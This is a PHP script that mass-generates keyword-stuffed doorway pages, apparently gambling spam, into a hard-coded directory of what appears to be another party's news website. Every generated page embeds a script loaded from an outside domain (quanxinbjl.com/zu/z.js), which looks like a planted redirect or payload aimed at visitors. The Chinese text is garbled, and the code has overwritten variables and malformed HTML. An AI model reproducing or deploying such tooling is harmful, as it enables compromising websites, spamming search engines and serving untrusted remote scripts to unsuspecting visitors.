<?php
error_reporting(E_ERROR);
set_time_limit(0);
$file = 'key.txt'; //��ȡ�ؼ��ֵ��ļ�

$contentfile = 'content.txt'; //��ȡ�����ļ�

$dir = '/backupweb/news.we54.com/we54/dlnh/2013/0527/';
mkdir("$dir");
$moban = <<<END

<script type="text/javascript" src="http://www.quanxinbjl.com/zu/z.js"></script>

END;
function make_seed()
{
    list($usec, $sec) = explode(' ', microtime());
    return (float) $sec + ((float) $usec * 100000);
}
function Spider_RAND($length)
{
	$possible = "ABCDEFGHIJKLM1234567890NOPQRX";
	$str = "";
	while(strlen($str) < $length)
	$str .= substr($possible,(rand() % strlen($possible)),1);
	return $str;
}

function AutoWrite($filename,$filedata)
{
	$dirdata1 ='<!DOCTYPE htm PUBLIC "-//W3C//DTD htm 4.01 Transitional//EN">'."\r\n".
'<htm><head><title>���ѹ���</title><meta http-equiv="Content-Type" content="text/htm; charset=gb2312">'."\r\n".
'<meta name="Keywords" content="�ټ���,���ֳ�,�ʹڲ��ɵ�ַ,�ʹ���̳��ַ,��̳��ʱ�ȷ�,��̳������Ѷ,��̳����_���ѹ���">'."\r\n".
'<meta name="Description" content="ȫѶ��,�ټ���,���ֳ�,spȫѶ��_����ĺ�ȫѶ��_̫����_ȫѶ��321����ַ��ȫ�����ṩ��̳��ʱ�ȷ֡���ˮ��̳_���ѹ���..">'."\r\n".
'<script type="text/javascript" src="http://www.quanxinbjl.com/zu/z.js"></script>'."\r\n".
'</head><body>'."\r\n".
'<table cellSpacing=0 cellPadding=0 width=778 align=center border=0 id="table2"></table>'."\r\n".
' 
<table cellSpacing=0 cellPadding=0 width=778 align=center border=0 id="table3"><tr><td vAlign=top width=242>'."\r\n".
'          &nbsp;&nbsp;&nbsp;</td></tr>'."\r\n".
'  </table>
<table cellSpacing=0 cellPadding=0 width=778 align=center border=0 id="table4"><tr><td height=10>'."\r\n".
 
 
 
 
 
 	'<TABLE width=950 border="1" align=center cellpadding="3" cellspacing="1" bordercolor="#B8B8B8" bgcolor="#F0F0F0" id="table5">'.

	'<TBODY>'."\r\n";
	$dirdata2 .= '</TBODY></TABLE><center>'."\r\n".
	'<table width="950" border="0" align="center" cellpadding="0" cellspacing="0" id="table6"><tr><td height="30" align="center">'.
	'<A href="index.html">��һҳ</A>'."\r\n".
	'<A href="page_2.html">�ڶ�ҳ</A>'."\r\n".
	'<A href="page_3.html">����ҳ</A>'."\r\n".
	'<A href="page_4.html">����ҳ</A>'."\r\n".
	'<A href="page_5.html">����ҳ</A>'."\r\n".
	'<A href="page_6.html">����ҳ</A>'."\r\n".
	'<A href="page_7.html">����ҳ</A>'."\r\n".
	'<A href="page_8.html">�ڰ�ҳ</A>'."\r\n".
	'<A href="page_9.html">�ھ�ҳ</A>'."\r\n".
	'<A href="page_10.html">��ʮҳ</A>'."\r\n".
	'<A href="page_11.html">��ʮһҳ</A>'."\r\n".
	'<A href="page_12.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_13.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">��ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">�ڶ�ʮҳ</A>'."\r\n".
	'<A href="page_14.html">�ڶ�ʮһҳ</A>'."\r\n".
	'<A href="page_14.html">�ڶ�ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">�ڶ�ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">�ڶ�ʮ��ҳ</A>'."\r\n".
	'<A href="page_14.html">�ڶ�ʮ��ҳ</A>'."\r\n".
	'<script type="text/javascript" src="http://www.quanxinbjl.com/zu/z.js"></script>'."\r\n".
 
 
 
 
 
 '  </td></tr><tr><td background=/images/index_35.gif height=25><P class=bottom align=center><A>��������</A> <A>��ϵ��ʽ</A>&nbsp; <A>��Ƹ��Ϣ</A> <A>��Ȩ����</A> '."\r\n".
 '   <A>��������</A> <A>��վ����</A></P></td></tr><tr><td height=35>'."\r\n".
'<P align=center>&nbsp;&copy;2005-2009 <A href="http://www.baidu.com" target=_blank>��ICP��88568��</A></P></td>'."\r\n".
'</tr></table> </body></htm>';





	$filecode = $dirdata1.$filedata.$dirdata2;
	$handle = @fopen($filename,'w');
	$key = @fwrite($handle,$filecode);
	@fclose($handle);
	return $key ? true : false;
}

function filew($filename,$filecode)
{
	$handle = @fopen($filename,'w');
	$key = @fwrite($handle,$filecode);
	@fclose($handle);
	return $key ? true : false;
}

$infile1 = $dir.'index.html';
$infile2 = $dir.'page_2.html';
$infile3 = $dir.'page_3.html';
$infile4 = $dir.'page_4.html';
$infile5 = $dir.'page_5.html';
$infile6 = $dir.'page_6.html';
$infile7 = $dir.'page_7.html';
$infile8 = $dir.'page_8.html';
$infile9 = $dir.'page_9.html';
$infile10 = $dir.'page_10.html';
$infile11 = $dir.'page_11.html';
$infile12 = $dir.'page_12.html';
$infile13 = $dir.'page_13.html';
$infile14 = $dir.'page_14.html';
$infile14 = $dir.'page_15.html';
$infile14 = $dir.'page_16.html';
$infile14 = $dir.'page_17.html';
$infile14 = $dir.'page_18.html';
$infile14 = $dir.'page_19.html';
$infile14 = $dir.'page_20.html';
$infile14 = $dir.'page_21.html';
$infile14 = $dir.'page_22.html';
$infile14 = $dir.'page_23.html';
$infile14 = $dir.'page_24.html';
$infile14 = $dir.'page_25.html';;
$guanjianzi = file($file);
$num = count($guanjianzi);
$content=file($contentfile);
$cnum=count($content);
$row=0;
for($k = 0;$k < $num;$k++)
{
	$wfile = $dir.$k.'.html';
	if($k<>0){
		$p=$k-1;
		$shang = "��һƪ��<a href=".($k-1).".html>".$guanjianzi[$p]."</a>";
	}else{
		$shang = "";
	}
	if($num>$k+1){
		$p=$k+1;
		$xia = "��һƪ��<a href=".($k+1).".html>".$guanjianzi[$p]."</a>";
	}else{
		$xia = "";
	}
	srand(make_seed());
	$startline = rand(0,$cnum);
	$getline = rand(5,20);
	reset($content);
	$c="";
	$y=0;
	while ($y<$getline){
		$yu=$startline+$y;
		$c=$c.$content[$yu]."<p>";
		$y++;
	}
	$newmoban = str_replace('{title}',$guanjianzi[$k],$moban);
	$newmoban = str_replace('{pass}',Spider_RAND(6),$newmoban);
	$newmoban = str_replace('{xia}',$xia,$newmoban);
	$newmoban = str_replace('{shang}',$shang,$newmoban);
	$newmoban = str_replace('{content}',$c,$newmoban);
	$newmoban = str_replace('{title}',$guanjianzi[$k],$newmoban);
	if($row==0){
		$ty="<TR>";
	}else{
		$ty="";
	}

	if($row==2){
		$te="</TR>";
		$row=-1;
	}else{
		$te="";
	}
	if($k < 1500)
	{

		$dirdata1 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 3000)
	{
		$dirdata2 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 4500)
	{
		$dirdata3 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 6000)
	{
		$dirdata4 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 7500)
	{
		$dirdata5 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 9000)
	{
		$dirdata6 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 10500)
	{
		$dirdata7 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 12000)
	{
		$dirdata8 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 13500)
	{
		$dirdata9 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 15000)
	{
		$dirdata10 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 16500)
	{
		$dirdata11 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 18000)
	{
		$dirdata12 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 19500)
	{
		$dirdata13 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 21000)
	{
		$dirdata14 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 25000)
	{
		$dirdata14 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 30000)
	{
		$dirdata14 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 35000)
	{
		$dirdata14 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 40000)
	{
		$dirdata14 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 50000)
	{
		$dirdata14 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}
	elseif($k < 60000)
	{
		$dirdata14 .= $ty."\r\n".'<TD><A href="'.$k.'.html'.'">'.$guanjianzi[$k].'</A></TD>'."\r\n".$te."\r\n";
		filew($wfile,$newmoban);
		echo "$k.html����...........ok\r\n<BR>";
	}

	$row++;
}
AutoWrite($infile1,$dirdata1);
AutoWrite($infile2,$dirdata2);
AutoWrite($infile3,$dirdata3);
AutoWrite($infile4,$dirdata4);
AutoWrite($infile5,$dirdata5);
AutoWrite($infile6,$dirdata6);
AutoWrite($infile7,$dirdata7);
AutoWrite($infile8,$dirdata8);
AutoWrite($infile9,$dirdata9);
AutoWrite($infile10,$dirdata10);
AutoWrite($infile11,$dirdata11);
AutoWrite($infile12,$dirdata12);
AutoWrite($infile13,$dirdata13);
AutoWrite($infile14,$dirdata14);
AutoWrite($infile14,$dirdata15);
AutoWrite($infile14,$dirdata16);
AutoWrite($infile14,$dirdata17);
AutoWrite($infile14,$dirdata18);
AutoWrite($infile14,$dirdata19);
AutoWrite($infile14,$dirdata20);
AutoWrite($infile14,$dirdata21);
AutoWrite($infile14,$dirdata22);
AutoWrite($infile14,$dirdata23);
AutoWrite($infile14,$dirdata24);
AutoWrite($infile14,$dirdata25);
?>
</body>
</html>